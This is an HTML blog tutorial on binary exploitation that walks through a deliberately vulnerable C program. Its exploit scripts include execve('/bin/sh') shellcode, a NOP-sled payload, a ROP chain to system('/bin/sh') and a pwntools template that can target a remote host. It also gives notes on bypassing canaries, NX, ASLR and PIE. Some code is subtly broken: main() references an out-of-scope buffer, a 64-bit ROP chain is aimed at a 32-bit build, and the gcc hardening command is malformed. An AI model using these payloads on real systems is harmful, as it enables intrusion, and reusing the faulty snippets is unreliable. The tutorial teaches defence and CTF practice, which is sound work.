<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binary Exploitation 101: Buffer Overflow Basics â€” Francis Kuria</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #e0e0e0; background: linear-gradient(135deg, #0a0e27 0%, #1a1a2e 100%); min-height: 100vh; }
        .container { max-width: 900px; margin: 0 auto; padding: 20px; }
        header { background: rgba(26, 26, 46, 0.8); backdrop-filter: blur(10px); padding: 20px 0; margin-bottom: 40px; border-bottom: 2px solid #3a86ff; }
        nav { display: flex; justify-content: space-between; align-items: center; max-width: 900px; margin: 0 auto; padding: 0 20px; }
        .logo { font-size: 24px; font-weight: bold; color: #3a86ff; text-decoration: none; }
        nav ul { display: flex; list-style: none; gap: 30px; }
        nav a { color: #e0e0e0; text-decoration: none; transition: color 0.3s; }
        nav a:hover { color: #3a86ff; }
        .article-meta { color: #888; font-size: 14px; margin-bottom: 20px; display: flex; gap: 20px; flex-wrap: wrap; }
        .tag { background: rgba(58, 134, 255, 0.2); padding: 5px 15px; border-radius: 20px; color: #3a86ff; font-size: 12px; text-transform: uppercase; }
        h1 { font-size: 42px; color: #ffffff; margin-bottom: 20px; line-height: 1.2; }
        h2 { font-size: 32px; color: #ffffff; margin: 40px 0 20px; padding-bottom: 10px; border-bottom: 2px solid #3a86ff; }
        h3 { font-size: 24px; color: #3a86ff; margin: 30px 0 15px; }
        p { margin-bottom: 20px; font-size: 17px; color: #d0d0d0; }
        code { background: rgba(58, 134, 255, 0.1); padding: 2px 8px; border-radius: 4px; font-family: 'Courier New', monospace; color: #3a86ff; }
        pre { background: #0d1117; padding: 20px; border-radius: 8px; overflow-x: auto; margin: 20px 0; border-left: 4px solid #3a86ff; }
        pre code { background: none; padding: 0; color: #e0e0e0; font-size: 14px; display: block; line-height: 1.5; }
        ul, ol { margin: 20px 0 20px 40px; color: #d0d0d0; }
        li { margin-bottom: 10px; font-size: 17px; }
        .highlight { background: rgba(58, 134, 255, 0.1); border-left: 4px solid #3a86ff; padding: 20px; margin: 20px 0; border-radius: 4px; }
        .memory-diagram { background: #0d1117; padding: 20px; border-radius: 8px; margin: 20px 0; border: 2px solid #3a86ff; font-family: 'Courier New', monospace; }
        .back-link { display: inline-block; color: #3a86ff; text-decoration: none; margin-top: 40px; padding: 10px 20px; border: 2px solid #3a86ff; border-radius: 5px; transition: all 0.3s; }
        .back-link:hover { background: #3a86ff; color: #ffffff; }
        footer { text-align: center; padding: 40px 20px; color: #888; margin-top: 60px; border-top: 1px solid rgba(58, 134, 255, 0.2); }
    </style>
</head>
<body>
    <header>
        <nav>
            <a href="../index.html" class="logo">ğŸ›¡ï¸ Francis Kuria</a>
            <ul>
                <li><a href="../index.html">Home</a></li>
                <li><a href="../index.html#work">Projects</a></li>
                <li><a href="index.html">Blog</a></li>
                <li><a href="../index.html#contact">Contact</a></li>
            </ul>
        </nav>
    </header>

    <div class="container">
        <article>
            <div class="article-header">
                <div class="article-meta">
                    <span class="tag">ğŸ´ CTF</span>
                    <span class="tag">Binary Exploitation</span>
                    <span>ğŸ“… Dec 5, 2025</span>
                    <span>â±ï¸ 15 min read</span>
                </div>
                <h1>Binary Exploitation 101: Buffer Overflow Basics</h1>
            </div>

            <p>Buffer overflows remain one of the most critical vulnerabilities in software security. Despite modern protections like DEP, ASLR, and stack canaries, understanding buffer overflows is fundamental to exploit development. This guide will take you from zero to writing your first exploit.</p>

            <h2>Understanding Memory Layout</h2>

            <p>Before exploiting memory corruption vulnerabilities, you need to understand how programs organize memory. A typical process memory layout looks like this:</p>

            <div class="memory-diagram">
<pre>High Memory Address
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚   Command Line &    â”‚ â† argc, argv, environment variables
â”‚   Environment       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚       Stack         â”‚ â† Grows downward
â”‚         â†“           â”‚   Local variables, function arguments
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                     â”‚
â”‚    (Unused Space)   â”‚
â”‚                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚       Heap          â”‚ â† Grows upward
â”‚         â†‘           â”‚   Dynamically allocated memory (malloc)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   BSS Segment       â”‚ â† Uninitialized global/static variables
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   Data Segment      â”‚ â† Initialized global/static variables
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   Text Segment      â”‚ â† Program code (read-only)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
Low Memory Address</pre>
            </div>

            <h2>The Stack: Where the Magic Happens</h2>

            <p>The stack is where buffer overflows typically occur. Let's examine a detailed stack frame:</p>

            <div class="memory-diagram">
<pre>Stack Frame Layout (grows downward)

Higher Addresses
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Function Arguments  â”‚ â† Parameters passed to function
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Return Address     â”‚ â† Where to return after function completes
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â† Saved EBP points here
â”‚  Saved Frame Ptr    â”‚ â† Previous stack frame's base pointer
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤  â† Current EBP points here
â”‚  Local Variable 1   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Local Variable 2   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Buffer[64]         â”‚ â† Our vulnerable buffer
â”‚       ...           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â† ESP points here (stack pointer)
Lower Addresses</pre>
            </div>

            <h2>Vulnerable Code Example</h2>

            <p>Let's start with a classic vulnerable program:</p>

            <pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vulnerable_function(char *input) {
    char buffer[64];
    
    // Dangerous! No bounds checking
    strcpy(buffer, input);
    
    printf("You entered: %s\n", buffer);
}

void secret_function() {
    printf("ğŸ‰ Congratulations! You've executed secret_function!\n");
    printf("In a real exploit, this would be shellcode execution.\n");
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    
    printf("Buffer is at: %p\n", &buffer); // For demonstration
    vulnerable_function(argv[1]);
    
    printf("Program completed normally.\n");
    return 0;
}

// Compile with protections disabled for learning:
// gcc -o vuln vuln.c -fno-stack-protector -z execstack -no-pie -m32</code></pre>

            <h3>What Makes This Vulnerable?</h3>

            <ul>
                <li><code>strcpy()</code> doesn't check bounds - it copies until it finds a null byte</li>
                <li>If input is larger than 64 bytes, it overflows into adjacent stack memory</li>
                <li>We can overwrite the saved return address</li>
                <li>When function returns, it jumps to our controlled address</li>
            </ul>

            <h2>Exploiting the Vulnerability</h2>

            <h3>Step 1: Find the Offset</h3>

            <p>First, we need to determine exactly how many bytes until we overwrite the return address:</p>

            <pre><code># Generate a unique pattern
from pwn import *

# Create pattern
pattern = cyclic(200)
print(pattern)

# Pattern looks like: aaaabaaacaaadaaaeaaaf...

# Run the program
./vuln $(python -c 'from pwn import *; print(cyclic(200))')

# In GDB, check the crash
gdb ./vuln
(gdb) run $(python -c 'from pwn import *; print(cyclic(200))')

# Program crashes when trying to return
# Check EIP (instruction pointer)
(gdb) info registers eip
eip: 0x61616172  # "raaa" in our pattern

# Find offset
python3 -c "from pwn import *; print(cyclic_find(0x61616172))"
# Output: 76

# So return address is at offset 76!</code></pre>

            <h3>Step 2: Control Execution Flow</h3>

            <p>Now we can control where the program jumps:</p>

            <pre><code>import struct

# Address of secret_function (get from GDB or objdump)
# objdump -d vuln | grep secret_function
# 08049182 &lt;secret_function&gt;:

secret_addr = 0x08049182

# Build exploit
payload = b"A" * 76              # Fill buffer + saved EBP
payload += struct.pack("&lt;I", secret_addr)  # Overwrite return address

# Write to file
with open("exploit", "wb") as f:
    f.write(payload)

# Test
# ./vuln $(cat exploit)</code></pre>

            <h3>Step 3: Executing Shellcode</h3>

            <p>Instead of jumping to existing functions, let's execute our own code:</p>

            <pre><code>from pwn import *

# 32-bit Linux shellcode: execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.i386.linux.sh())

# Alternatively, handwritten shellcode:
shellcode = (
    b"\x31\xc0"              # xor eax, eax
    b"\x50"                  # push eax
    b"\x68\x2f\x2f\x73\x68"  # push 0x68732f2f  ("/sh")
    b"\x68\x2f\x62\x69\x6e"  # push 0x6e69622f  ("/bin")
    b"\x89\xe3"              # mov ebx, esp
    b"\x50"                  # push eax
    b"\x53"                  # push ebx
    b"\x89\xe1"              # mov ecx, esp
    b"\xb0\x0b"              # mov al, 0xb
    b"\xcd\x80"              # int 0x80
)

# NOP sled for reliability
nop_sled = b"\x90" * 20

# Calculate payload
buffer_addr = 0xbffff100  # Get from GDB or program output

payload = nop_sled + shellcode
payload += b"A" * (76 - len(payload))
payload += struct.pack("&lt;I", buffer_addr)

# Launch exploit
p = process(['./vuln', payload])
p.interactive()  # You now have a shell!</code></pre>

            <h2>Modern Protections and Bypasses</h2>

            <h3>1. Stack Canaries</h3>

            <p>Stack canaries are random values placed between the buffer and return address:</p>

            <pre><code>// Canary protection
void vulnerable_function(char *input) {
    unsigned long canary = __stack_chk_guard;  // Random value
    char buffer[64];
    
    strcpy(buffer, input);
    
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // Canary corrupted! Abort!
    }
}

// Bypass techniques:
// 1. Leak the canary value (format string bug)
// 2. Brute force (possible on 32-bit forks)
// 3. Overflow only the exact bytes needed
// 4. Target other memory regions (heap, GOT)</code></pre>

            <h3>2. DEP/NX (Data Execution Prevention)</h3>

            <p>DEP marks stack/heap as non-executable. We can't execute shellcode there anymore.</p>

            <div class="highlight">
                <h4>Bypass: Return-Oriented Programming (ROP)</h4>
                <p>Instead of injecting code, reuse existing code snippets called "gadgets":</p>

                <pre><code># Find gadgets in the binary
from pwn import *

elf = ELF('./vuln')
rop = ROP(elf)

# Find useful gadgets
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(elf.search(b'/bin/sh'))
system = elf.symbols['system']

# Build ROP chain
payload = b"A" * 76
payload += p64(pop_rdi)    # Pop /bin/sh address into RDI
payload += p64(bin_sh)     # Address of "/bin/sh" string
payload += p64(system)     # Call system("/bin/sh")

# This executes system("/bin/sh") using only existing code!</code></pre>
            </div>

            <h3>3. ASLR (Address Space Layout Randomization)</h3>

            <p>ASLR randomizes memory addresses each time the program runs:</p>

            <pre><code># Bypass techniques:

# 1. Information Leak
# Use format string or other bugs to leak addresses
# Then calculate offsets

# 2. Partial Overwrite
# ASLR on 32-bit only randomizes higher bytes
# Brute force the remaining bytes

# 3. NOP Sled
# Large NOP sled increases chance of landing in valid code

# 4. Ret2plt
# PLT (Procedure Linkage Table) has fixed offsets
# Use PLT entries to call library functions</code></pre>

            <h3>4. PIE (Position Independent Executable)</h3>

            <p>PIE randomizes the base address of the executable itself:</p>

            <pre><code># Bypass: Leak program base address
# Then calculate all other addresses relative to base

# Example leak using format string:
payload = b"%3$p"  # Leak stack address
# Use leaked address to calculate binary base</code></pre>

            <h2>Practical Exploitation Workflow</h2>

            <h3>1. Reconnaissance</h3>

            <pre><code># Check file type and protections
file vuln
checksec vuln

# Output shows:
# RELRO: Partial RELRO
# Stack: No canary found
# NX: NX disabled
# PIE: No PIE

# Disassemble interesting functions
objdump -d vuln -M intel | grep -A 20 vulnerable_function</code></pre>

            <h3>2. Dynamic Analysis</h3>

            <pre><code># GDB with pwndbg/gef for better visualization
gdb ./vuln

# Set breakpoint at vulnerable function
(gdb) break vulnerable_function

# Run with test input
(gdb) run $(python -c 'print("A"*100)')

# Examine stack
(gdb) x/50wx $esp

# Step through execution
(gdb) ni  # Next instruction
(gdb) si  # Step into

# Check registers
(gdb) info registers</code></pre>

            <h3>3. Exploit Development</h3>

            <pre><code>#!/usr/bin/env python3
from pwn import *

# Configure target
binary = './vuln'
context.binary = binary
context.log_level = 'debug'

# Start process or connect to remote
if args.REMOTE:
    p = remote('target.com', 1337)
else:
    p = process(binary)

# Build exploit
offset = 76
shellcode = asm(shellcraft.sh())
nop_sled = asm('nop') * 50

# Get buffer address (from leak or static analysis)
buffer_addr = 0xbffff100

payload = nop_sled + shellcode
payload += b"A" * (offset - len(payload))
payload += p32(buffer_addr)

# Send exploit
p.sendline(payload)

# Get shell
p.interactive()</code></pre>

            <h2>Defensive Techniques</h2>

            <h3>Secure Coding Practices</h3>

            <pre><code>// Bad: Unsafe functions
strcpy(dest, src);
gets(buffer);
sprintf(buf, "%s", input);

// Good: Size-limited functions
strncpy(dest, src, sizeof(dest) - 1);
fgets(buffer, sizeof(buffer), stdin);
snprintf(buf, sizeof(buf), "%s", input);

// Best: Safe wrappers
size_t strlcpy(char *dst, const char *src, size_t size);
// Or use modern languages with memory safety (Rust, Go)</code></pre>

            <h3>Compiler Protections</h3>

            <pre><code># Enable all protections
gcc -o secure program.c \
    -fstack-protector-strong \  # Stack canaries
    -D_FORTIFY_SOURCE=2 \       # Buffer overflow detection
    -Wl,-z,relro,-z,now \       # Full RELRO
    -pie -fPIE                  # Position independent code

# Additional runtime protections
# - ASLR: enabled by kernel
# - DEP/NX: enabled by compiler/linker</code></pre>

            <h2>Learning Resources</h2>

            <div class="highlight">
                <h4>Practice Platforms:</h4>
                <ul>
                    <li><strong>pwnable.kr</strong>: Beginner-friendly pwn challenges</li>
                    <li><strong>exploit.education</strong>: Progressive difficulty</li>
                    <li><strong>pwnable.tw</strong>: Advanced challenges</li>
                    <li><strong>ROP Emporium</strong>: Focus on ROP techniques</li>
                </ul>

                <h4>Essential Tools:</h4>
                <ul>
                    <li><strong>pwntools</strong>: Python exploitation framework</li>
                    <li><strong>GDB + pwndbg/gef</strong>: Enhanced debugging</li>
                    <li><strong>ROPgadget/ropper</strong>: Find ROP gadgets</li>
                    <li><strong>checksec</strong>: Analyze binary protections</li>
                </ul>
            </div>

            <h2>Conclusion</h2>

            <p>Buffer overflows are a perfect introduction to binary exploitation. They teach fundamental concepts about memory layout, assembly language, and program execution flow. While modern systems have multiple layers of protection, understanding these basics is essential for advanced exploitation techniques.</p>

            <p>Start with simple challenges where protections are disabled, then gradually work your way up to bypassing modern defenses. Each protection you learn to bypass deepens your understanding of system security.</p>

            <p>Remember: Use these skills ethically and legally. Binary exploitation is a powerful technique that should only be used for authorized security research and CTF competitions.</p>

            <a href="index.html" class="back-link">â† Back to Blog</a>
        </article>
    </div>

    <footer>
        <p>Â© 2026 Francis Kuria â€¢ Sharing security knowledge, one post at a time</p>
    </footer>
</body>
</html>
